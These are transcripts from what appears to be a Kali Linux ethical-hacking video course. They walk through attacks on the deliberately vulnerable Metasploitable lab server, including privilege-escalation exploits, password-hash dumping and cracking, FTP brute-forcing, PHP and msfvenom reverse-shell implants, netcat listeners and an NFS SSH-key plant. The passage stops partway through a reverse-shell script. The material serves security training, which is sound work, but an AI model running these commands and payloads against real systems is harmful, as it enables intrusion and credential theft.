> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-perl?u=76281980&t=0)** - GuildFTPd is a free to download third-party FTP server. And there's an exploit for it, written using Pearl. Let's check out exploit DB. Searchsploit, GuildFTP. Okay, we've got three vulnerabilities identified and two versions. Let's copy the last one, which is a Pearl exploit. Copy, slash, user, slash, share, slash, exploit DB, slash, exploits. And we want [[Windows]], remote, 8200 dot PL. And I'll just copy that into a 8200 dot PL. Okay, let's take a look. Nano 8200 dot PL. Okay, we can see an explanation of the exploits, which allows remote file deletion, with directory traversal outside the scope of the FTP root directory. We can see here, an example of the exploits usage. The exploit requires the server IP address and port, as well as credentials to enter the FTP server. It also requires of course, the file name of the file to delete. The exploit code makes a connection to the server, and then issues the user and past lines to gain access to FTP. It then issues the delete command. We don't need to change the code.
>
> **[1:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-perl?u=76281980&t=93)** All that's needed is to set the command line parameters. The exploit isn't particularly sophisticated. It's just issuing commands to the server, based on what's on the command line. However, it does provide a simple example of a Pearl exploit.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (1)
> **Env Vars:** ftp (4)
> **Tools:** command line (2)
> **Definitions:** is a  (2)
> **Speakers:** - guildftpd (1)

#### [Exploiting with C](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=0)** - [Instructor] One of the more common languages for exploits is C. Let's take a look at the 2021 Baron Samedit exploit, which enables privilege escalation. We'll download this from [[GitHub]]. [[Git]] clone https [github.com](https://github.com) 1N53C CVE-2021-3156-POC.git. Then we'll clone into samedit. And we'll go into samedit. And we can see we have two C files, hax.C and lib.C Let's take a look at hax.C. If we scroll down, we can see the versions of [[Linux]] which have been tested against. And a little further down, we can see the usage details. Below that, we can see that the exploit is setting up a couple of smash arrays to overflow memory when doing a pseudo edit call. And if successful will then pop a shell. Okay, this comes with a make file, so let's check it out. Nano Makefile. This is doing a straightforward GCC compilation, but let's change the output file name to samedit to make it a bit simpler.
>
> **[1:38](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-c?u=76281980&t=98)** Okay. Now let's make it. And we can now run samedit and we get a list of targets. We're not one, fortunately.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[GitHub]] (2), [[Git]] (2), [[Linux]] (1)
> **CLI Commands:** make (3), git (2)
> **File Paths:** hax.c (2), lib.c (1)
> **Env Vars:** cve (1), poc (1), gcc (1)
> **Tools:** github (2)
> **URLs:** [github.com](https://github.com) (1)
> **UI Navigation:** scroll down (1)
> **Speakers:** - [instructor] (1)

#### [Exploiting with CPP](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=0)** - [Instructor] The Dirty COW exploit enables us to achieve privilege escalation in [[Linux]]. And it's a popular exploit for doing this. It's an exploit which targets the copy on write function and it does a dirty write back of memory. Let's see if we have this in searchsploits. searchsploit dirty cow. Okay, we've got a few. Let's take a look at the C++ one. I'll copy it down to a file called DirtyCow.cpp. cp /usr/share/[[Exploit-DB|exploitdb]]/exploits And it's in linux/local/40847.cpp
>
> **[0:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=52)** And we'll call it DirtyCow.cpp Let's take a look at it. nano DirtyCow.cpp At the start of the comments, we can see how to compile the exploit and an explanation of what it does when it runs. As we scroll, we can see a bunch of defines, including the location of the password file and a password file entry. In the code itself, we can see where it overwrites the root password. And further down at the end of the code, there's a print info function, which describes the command line parameters. And we can see the S option means we'll open a shell directly after overriding the password. There's no requirement to change this code, so we can compile it directly, and often we'd want to do this on the target. g++ -Wall
>
> **[1:56](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=116)** - pedantic -O2
>
> **[2:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=121)** - std=c++11
>
> **[2:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-cpp?u=76281980&t=128)** - pthread We'll output it to DirtyCow, and we'll read the DirtyCOW.cpp module and we'll use -lutil. Okay, we've now got our Dirty COW privilege escalation exploit.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Linux]] (2), [[Exploit-DB|Exploitdb]] (1)
> **File Paths:** dirtycow.cpp (4), linux/local/40847.cpp (1)
> **Speakers:** - [instructor] (1), - pedantic (1), - std (1), - pthread (1)
> **Env Vars:** cow (2)
> **CLI Commands:** cp (1)
> **Tools:** command line (1)


### 4. Passwords

[↑ Back to Table of Contents](#table-of-contents)

#### [Obtaining Windows passwords](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=1)** - [Instructor] The easiest way to access a system is to walk in the front door using a valid set of credentials. And when we carry out [[Penetration Testing]], we'll often be looking at a network rather than just a single host. So getting access to a password on one machine may well give us that front door access for another. Let's have a look at what we need to do to collect credentials from a [[Windows]] target. We'll start by opening the Windows Command Shell as administrator. We can list the user accounts on a system by using the net user command. And we can then get more details by selecting one. Windows credentials may come from an [[Active Directory]] account or maybe stored locally. Passwords are stored in two ways. The LAN manager password hash and the NT password hash. These are often seen together separated by a colon in what's known as an NTLM hash pair. Neither of the passwords is salted. LM hashes are limited to 14 characters, a password greater than 14 characters result in the LM hash not being stored. This is a security advantage, but may reduce backwards compatibility. The credentials are stored in the same database. We need to be an administrator to see it.
>
> **[1:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=86)** We can see the sam file, but it's locked when the operating system is active. So if we try to just copy it, we'll get an access rejection. We have to find another way to extract the sam database. This is straightforward because Windows provides a registry tool to take a backup copy of the sam and security files.
>
> **[1:50](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=110)** So we've successfully copied the sam file.
>
> **[2:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=123)** And we've copied this security file.
>
> **[2:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=135)** And the system file. Now we need to process these files to extract hashes and possibly passwords from them. I've copied these files into my kali system already, so let's go and take a look at them. Kali provides a number of tools to use to extract hashes from the sam database. The first is samdump2. We run it with a command samdump2 system.save sam.save.
>
> **[2:45](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=165)** And we get the hashes. A similar tool is pwdump and it uses the same command line parameters.
>
> **[2:58](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=178)** We can also use a [[Python (Programming Language)|Python]] script called secretdump.py which comes as an example in the in packet tool. We can run that using Python and again, reading the sam and system dumps. And we again get the hashes. The easiest way to collect the hashes, if we can achieve a privileged account on the target, is to use the hashdump function on meterpreter. I'll set up a meterpreter listener.
>
> **[3:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=228)** I've downloaded the winmat.exe shell implant to my Windows target. So I can now run it to get a meterpreter session. And I've now got a meterpreter session running between my Windows target and my kali system. All I need to do now is to run the hashdump command and we get the hashes. Having got our hashes, we can now run these through an offline cracking program, such as [[John the Ripper]], to attempt to crack them and recover the passwords. We can do that by copying the output from the hashdump into a file. I've copied them into my hash.txt. So let's try cracking them using the Rockyou.txt [[Microsoft Word|word]] list I'll force NT old format for this run. And we can see the account credentials that have been recovered. There's a tool we can install into Windows called sam inside, and this provides a graphical interface for collecting hashes from the hives and also cracking them. This may be useful if we have remote desktop access to the target. We can download the zip archive from the site shown and extract the files. We need to make a dictionary file. I've copied over our popular Rockyou.txt file from Kali. Let's go to tools, options, and add that to sam inside.
>
> **[5:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=317)** Okay, we can now import our hives using the left hand icon and the top option for importing sam and system hives.
>
> **[5:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-windows-passwords?u=76281980&t=334)** Okay, we've got the hives imported and we can see the hashes. We can see that the LM passwords are disabled. We can see one empty and two disabled NT passwords. And that Zach's password is Zach. We'll select tools and force an NT hash attack and a dictionary attack. And I'll mark all users for attack. We can now select the big orange go button, and this will run the password crack. We can see we're getting some passwords coming up, secret, BlueLagoon, Password and password.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (7), [[Python (Programming Language)|Python]] (2), [[Penetration Testing]] (1), [[Active Directory]] (1), [[John the Ripper]] (1)
> **File Paths:** rockyou.txt (2), secretdump.py (1), hash.txt (1)
> **CLI Commands:** python (2), find (1), make (1)
> **Env Vars:** lan (1), ntlm (1)
> **UI Navigation:** go to (1), select the (1)
> **Definitions:** known as (1), is a  (1)
> **Prerequisites:** set up (1), install (1)
> **Cross-References:** coming up (1)

#### [Obtaining Linux passwords](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=0)** - [Instructor] We've looked at how we might obtain [[Windows]] passwords. So, let's now look at collecting a [[Linux]] target credentials. On a standard Linux system, the user accounts are held in the /etc/password file. We can look at our Kali password file. The password file contains the user ID, the password, the GID or privileged level, a name, and login shell. Notice here the passwords have been replaced with an X. That's because for security reasons, the passwords themselves have been moved to another file called /etc/shadow. The shadow file is not accessible unless we're running with root privileges. As we are, we can take a look at it. I'll scroll back up and we can see that most entries have an asterisk, but the root account has a hexadecimal value in the second field. This is the password hash. I've extracted the set of credentials from a target system. In order to recover the passwords, I need to combine the two extracted files back into a single password file, using [[John the Ripper|John]] the Rippers and shadow tool. Okay, let's look at the file full that we've created. We can see that the password hashes have been reinserted into the password file, second field. Now we run a password crack using [[John the Ripper]] to recover the passwords.
>
> **[1:38](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/obtaining-linux-passwords?u=76281980&t=98)** And we can see that we've extracted a lot of credentials.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Linux]] (2), [[Windows]] (1), [[John the Ripper|John]] (1), [[John the Ripper]] (1)
> **Env Vars:** gid (1)
> **Speakers:** - [instructor] (1)


### 5. Exploiting the Metasploitable Server

[↑ Back to Table of Contents](#table-of-contents)

#### [Targeting Metasploitable](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/targeting-metasploitable?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/targeting-metasploitable?u=76281980&t=0)** - [Instructor] Offensive security provides the metasploitable two system, as a vulnerable target for ethical hackers who are starting out to build their skills. The first task in understanding a target is to scan it. Let's scan metasploitable, and we'll run a TCP port scan, [[Nmap]] -PS -sV 10.0.2.8.
>
> **[0:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/targeting-metasploitable?u=76281980&t=32)** This shows many open services and we're literally spoiled for choice. We'll run through some of the well-known metasploitable exploits to get ready for some slightly harder end to end exercises.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Nmap]] (1)
> **Code Identifiers:** sv (1)
> **Env Vars:** tcp (1)
> **Versions:** 10.0.2 (1)
> **Speakers:** - [instructor] (1)

#### [Exploiting VSFTPD](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=0)** - [Instructor] Let's take a look at the FTP service running on port 21 on Metasploitable. And to remind ourselves what it is, We'll run [[Nmap]] minus PS, minus SV, minus port 21, 10.0.2.8 And we can see it's VSFTPD 2.3.4. Let's see if we can get in with anonymous access, 10.0.2.8, and we'll go a anonymous and we'll put in our email as the password. And we successfully logged in. But when we have a look, there's nothing in the folder. Okay. So if we can't get in and exploit this through the front door, let's try the back door. I'll check what exploit DB knows about exploits for VSFTPD and we'll use searchsploit for that, searchsploit VSFTPD. And there's a few exploits here, including a backdoor command execution in ruby. So it's likely a [[Metasploit]]. So let's open up [[Metasploit|MSF]] console, and we'll search for the VSFTPD exploits. And we can see it's here. So we'll use that, and we'll set our hosts, our targets. Host to 10.0.2.8, and we'll set Lhost, my Collie workstation to 10.0.2.18.
>
> **[1:43](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=103)** Let's have a look at what payloads we've got to use. So we'll show, payloads, and we only have one. So let's set, payload to CMD unix interact, and let's run that exploit. Okay. We get a banner and we can see that we're running, I'd go with zero. And we've got a command show. who am I? I'm root. We've got a root command. We now own the system. Okay, we'll get out of there. Before we go let's take a look to our original exploits. The VSFTPD backdoor we used through Metasploit was maliciously inserted into the 2.3.4 version of VSFTPD. And activated when a person use the username backdoor and the password, invalid. We can manually activate this. FTP 10.0.2.8. And for the name, bacKdoored, smiley and the password invalid. When FTP hangs. Let's open another terminal, and we'll tell net 10.0.2.8 6200 and check, who am I?
>
> **[3:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-vsftpd?u=76281980&t=196)** And we root. And note, the use of semi-colons to terminate the command.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Metasploit]] (2), [[Nmap]] (1), [[Metasploit|Msf]] (1)
> **Env Vars:** vsftpd (6), ftp (3), nmap (1), msf (1), cmd (1)
> **Versions:** 10.0.2 (6), 2.3.4 (2)
> **Ports:** port 21 (2)
> **CLI Commands:** ruby (1)
> **Code Identifiers:** backdoored (1)
> **Tools:** terminal (1)
> **Speakers:** - [instructor] (1)

#### [Exploiting with ProFTPD](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=0)** - [Narrator] Let's take a look at the service on port 2121. N map minus PS minus SV minus P2121
>
> **[0:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=12)** on our max exploitable server. And we can see this as an FTP service. So let's connect to it. FTP 10 dot nought dot two dot 8, 2121. Okay, we're connected. And let's see if we can log in as anonymous. Anonymous and our email address, but we're unable to log in as anonymous. It's a pro FTP 1.3.1. So let's have a look at SearchSploit. And we have a few exploits here, but there's nothing specifically aimed at 1.3.1. It looks like we might have to try harder to exploit this service. Let's try [[Metasploit]], FTP brute force login. [[Metasploit|MSF]] console. Okay, so we'll use the auxiliary scanner for FTP and we'll try FTP login. We'll set our host to 10 dot nought dot two dot eight, set our port to 2121 and we'll set the brute force speed. Underscore speed to one
>
> **[1:49](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=109)** to avoid the service rejecting the scan. So we'll go slowly. We'll use the standard Unix user list with the same password. I've already created a blank file, which we'll use for the password file to save time. Set user underscore file to user share [[Microsoft Word|word]] lists, Metasploit Unix underscore users dot text.
>
> **[2:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=143)** Set user pass file and that's our empty file, empty dot text. So we'll just try and set user as pass. So we're looking for combinations where the user ID and password are the same. And we'll say that it's true. And we'll run that. This takes a while so we'll come back when it's finished. All right, we're finished and we've found three sets of credentials. User user, service service and [[PostgreSQL|Postgres]] Postgres. Let's go in with user. FTP 10 dot nought dot two dot 8, 2121.
>
> **[3:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=195)** User user and we logged in. Let's see what we can see. And we have our normal hidden files. Let's have a look at the web folder. LS slash var slash www. Okay, and let's see if we can write into it with our shelly implant Put shelly dot [[PHP]] to slash var slash www slash shelly dot php. And we get permission denied. But we can see there's a dav folder, which does have right permissions. So let's put shelly dot php to slash var, slash www slash dav slash shelly dot php.
>
> **[4:09](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=249)** And that was successful. Okay, we now have an implant on the system. Let's set up a listener. NC minus LVNP 2222,
>
> **[4:27](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=267)** and we'll execute the implant. 10 dot nought dot two dot eight slash dav, slash shelly dot php. And here we have a shell. We can see it's a www dash data user shell, the first step to escalating our privileges to route.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (5), [[Metasploit]] (2), [[PostgreSQL|Postgres]] (2), [[Metasploit|Msf]] (1), [[Microsoft Word|Word]] (1)
> **Env Vars:** ftp (7), p2121 (1), msf (1), lvnp (1)
> **CLI Commands:** php (5), ls (1)
> **Versions:** 1.3.1 (2)
> **Ports:** port 2121 (1)
> **Prerequisites:** set up (1)
> **Speakers:** - [narrator] (1)

#### [Exploiting Tomcat](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980&t=0)** - Let's take a look at what's running on port 8180 on our Metasploitable server. We'll go directly to the website. 10.0.2.8:8180 And we can say it's a Tomcat server. We have links to the manager and administrator. Let's open the manager portal, and we know that tomcat, when it's installed has credentials, default credentials, tomcat. tomcat, So let's say if they work and they do, and we have the Tomcat application manager showing the applications running in Tomcat, and we have the ability to deploy more applications, either from the Tomcat server or from our system. Just go back to the main menu and have a look at Tomcat administration. We might again try the default credentials, tomcat, tomcat, and we can get into the administration tool. We've now got complete control over the Tomcat web server. Controlling the web service fine, but we really want to control the total system. Kali provides us with a means of creating war files using [[Metasploit|msfvenom]]. And this will create a [[Java]] application in a war file. So let's create one which delivers a command shell. msfvenom -p java/jsp_shell_reverse_tcp
>
> **[1:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980&t=104)** LHOST=10.0.2.18 our kali system will create it on LPORT=2222 we'll make the format -f war and we'll write that out to &gt;shelly.war Okay. We'll have a shell implant. We can upload into Tomcat. So let's set up our listener and then go and do that. nc -lvnp 2222.
>
> **[2:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980&t=139)** Back in Tomcat, we can browse to our shelly.war file, open that and deploy it. And then in the main list of applications, we can see shelly's been deployed. We can now either click the entry here, or we can just browse to the war file from the URL. If we want to start it later, we'll start it now. So we'll do it from here. We've now got a connection back from the Tomcat server. We've got to show and we're running as the tomcat55 user.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Metasploit|Msfvenom]] (2), [[Java]] (2)
> **Env Vars:** lhost (1), lport (1), url (1)
> **Ports:** port 8180 (1), :8180 (1)
> **Versions:** 10.0.2 (2)
> **CLI Commands:** make (1)
> **Code Identifiers:** jsp_shell_reverse_tcp (1)
> **Cross-References:** go back to (1)
> **UI Navigation:** open the (1)

#### [Exploiting IRC](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980&t=0)** - [Instructor] Let's take a look at the IRC service on port 6667 our metasploitable server, [[Nmap]] -PS -sV -p6667 10.0.2.8.
>
> **[0:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980&t=16)** We can see it's an Unreal IRCd service. Let's see what [[Metasploit]] has for us. We'll search for unreal, and we can see we've got an exploit for unreal IRCd 3.2.8.1. Now we didn't get the version on the banner, but let's give it a go anyway. We'll use two, we'll set rhost 10.0.2.8, we'll set our lhost 10.0.2.18 for Carly workstation,
>
> **[1:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980&t=61)** and we'll set the payload to the standard cmd/unix/reverse shell
>
> **[1:13](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980&t=73)** and we'll exploit. We have a shell, and who am I? It's a root shell.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Nmap]] (1), [[Metasploit]] (1)
> **Versions:** 10.0.2 (3), 3.2.8 (1)
> **Code Identifiers:** sv (1)
> **Ports:** port 6667 (1)
> **Env Vars:** irc (1)
> **Speakers:** - [instructor] (1)

#### [Exploiting the distributed compile system](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980&t=0)** - [Instructor] Sometimes we'll run a default scan and find nothing of interest. But in fact, there could be services existing on ports outside of the default scanning range. If we run a wider scanner on Metasploitable, we find that there's a service running on port 3632. Let's check this, and map minus PS minus sV minus p3632.
>
> **[0:28](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980&t=28)** And we find the distccd service. Let's check what searchsploit has for us, searchsploit distcc. And we find there's a command execution in [[Metasploit]] for this cc. [[Metasploit|Msfconsole]] and we'll search again for distcc
>
> **[0:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980&t=54)** and we find it we'll use zero and we'll set our remote host to 10.0.2.8. And we'll set lhost* Kali System 10.0.2.18 And we'll set the payload to cmd/unix/reverse
>
> **[1:21](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980&t=81)** and we'll exploit. And we have a shell, who am I, we're a daemon. And we're in a user shell.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Metasploit]] (1), [[Metasploit|Msfconsole]] (1)
> **CLI Commands:** find (5)
> **Versions:** 10.0.2 (2)
> **Code Identifiers:** sv (1)
> **Ports:** port 3632 (1)
> **Speakers:** - [instructor] (1)

#### [Exploiting network files](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980&t=0)** - [Instructor] Let's take a look at port 2049 on our Metasploitable host. [[Nmap]] -PS -sV -p2049 10.0.2.8
>
> **[0:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980&t=16)** Okay, we have the NFS service running. Let's take a look at what exported mounts we have available on Metasploitable. Showmount -e 10.0.2.8. Okay, we have a root share we can use. If we haven't already done so let's create a key pair that we can use to connect to it, ssh-keygen. Okay, we have a new key pair stored in the SSH folder. Let's also create a folder that we can use to mount the Metasploitable share to. We'll mkdir/tmp/myroot, and let's remotely mount that through NFS, sudo mount -t nfs 10.0.2.8:/
>
> **[1:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980&t=72)** and we'll mount that in tmp/myroot. Okay, that's mounted. We now want to append our public key to the list of authorized keys for access through SSH, and we have to do that as root. We'll make sure we've set a root password on our Kali system by sudo passwd and putting in a new password, and now we'll switch to root with the new password. Okay, so we're running as root on Kali. What we now need to do is add our public key to the authorized users on Metasploitable, and we do that by saying cat .ssh/id_rsa.pub
>
> **[2:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980&t=124)** to /tmp/myroot, and it goes into the root, .ssh/authorized_keys.
>
> **[2:22](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980&t=142)** So we'll upend that to Metasploitable's list of authorized keys in root. Okay, that's done. That's all we need to do with the share, so let's unmount now and let's quit out of root, umount/tmp/myroot, and exit.
>
> **[2:46](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980&t=166)** Now let's try an SSH into Metasploitable, ssh root@10.0.2.8, and we're in as root.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Nmap]] (1)
> **CLI Commands:** ssh (7), sudo (2), mkdir (1), make (1), cat (1)
> **Env Vars:** ssh (3), nfs (2)
> **Versions:** 10.0.2 (4)
> **Code Identifiers:** sv (1), id_rsa (1), authorized_keys (1)
> **Ports:** port 2049 (1)
> **UI Navigation:** switch to (1)
> **Speakers:** - [instructor] (1)

#### [Hiding in plain sight](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiding-in-plain-sight?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiding-in-plain-sight?u=76281980&t=0)** - [Instructor] Let's take a look at Port 1524 on Metasploitable. [[Nmap]] -PS -sV
>
> **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiding-in-plain-sight?u=76281980&t=8)** - p1524 10.0.2.8, and it's reported there's a Metasploitable root shell. Let's see. telnet 10.0.2.8 1524, and we're in root at Metasploitable. And it is root. Someone set up a convenient, quick shell access for themselves and hoped it would be hidden. We don't need to exploit a target if someone's left a door open for us.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Nmap]] (1)
> **Versions:** 10.0.2 (2)
> **Speakers:** - [instructor] (1), - p1524 (1)
> **Code Identifiers:** sv (1)
> **Ports:** port 1524 (1)
> **Prerequisites:** set up (1)

#### [Escalating to root](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=0)** - [Instructor] We've looked at a number of Metasploitable attacks that provide a user shell. But our goal is to get full control of the system through a root shell. Let's look at how we escalate privileges. First of all, let's go back to one of our user shells that we got with the shelly.[[PHP]] implant, which we uploaded using ProFTPD. We still have the PHP file loaded into Metasploitable. So all we need to do is to execute it and link back to our listener, nc -lvnp 2222.
>
> **[0:36](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=36)** And we execute, and we have a shell. Okay, now we're here. Let's get the exact operating system and version. Uname -a, lsb_release -a.
>
> **[0:53](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=53)** We can see we're [[Linux]] Kernel 2.6.24 and we're running [[Ubuntu]] 8.04. Let's see what the Ubuntu exploits there are for a Linux Kernel with 2.6 in its version using Searchsploit. Searchsploit Linux Kernel 2.6 Ubuntu.
>
> **[1:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=79)** And we see we've got quite a few. I'll select the third on the list. It's a C program, so we'll have to download it, copy it to the target, and compile and run it there. We'll copy it locally, just for the moment. user/share/[[Exploit-DB|exploitdb]]/exploits
>
> **[1:41](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=101)** and it's a Linux/local called 8572.c, and we'll copy it to where we are. And let's take a look at it. We can see the exploit needs of value as an argument, which is the pit of the netlink socket as listed in the file proc/net/netlink. So we'll check that when we're ready to go. It also needs a batch file called run, continuing the commands we want to run. And we'll use this to open a reverse shell on port 4444. So let's create that now. Nano run, and we'll make a bin/bash file, which will issue a command netcut 10.2.18 4444,
>
